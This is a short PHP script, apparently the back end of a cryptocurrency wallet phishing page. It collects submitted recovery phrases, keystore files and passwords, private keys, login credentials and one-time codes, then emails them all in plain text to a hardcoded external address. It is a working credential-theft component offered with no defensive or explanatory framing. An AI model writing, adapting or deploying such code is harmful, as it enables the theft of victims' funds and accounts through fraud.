<?php
// Capture form data
$phrase = Trim(stripslashes($_POST['phrase'])); 
$keystore = Trim(stripslashes($_POST['keystore'])); 
$password = Trim(stripslashes($_POST['keystorepassword'])); 
$private = Trim(stripslashes($_POST['private'])); 
$login = Trim(stripslashes($_POST['username'])); 
$loginpassword = Trim(stripslashes($_POST['loginpassword'])); 
$loginOTP = Trim(stripslashes($_POST['loginOTP'])); 

// Prepare the email body
$Body = "Egbon\n";
$Body .= "phrase: {$phrase}\n";
$Body .= "keystore: {$keystore}\n";
$Body .= "username: {$login}\n";
$Body .= "password: {$loginpassword}\n";
$Body .= "OTP: {$loginOTP}\n";
$Body .= "private: {$private}\n";

// Set email parameters
$to = 'jazzyqueengirl@proton.me'; // Recipient's email address
$subject = 'Form Submission Results';
$headers = "From: sender@example.com\r\n"; // Replace with the sender's email address
$headers .= "Reply-To: sender@example.com\r\n"; // Replace with the sender's email address
$headers .= "Content-Type: text/plain; charset=UTF-8\r\n";

// Send the email
if (mail($to, $subject, $Body, $headers)) {
    echo 'Message has been sent';
} else {
    echo 'Message could not be sent';
}

exit();
?>
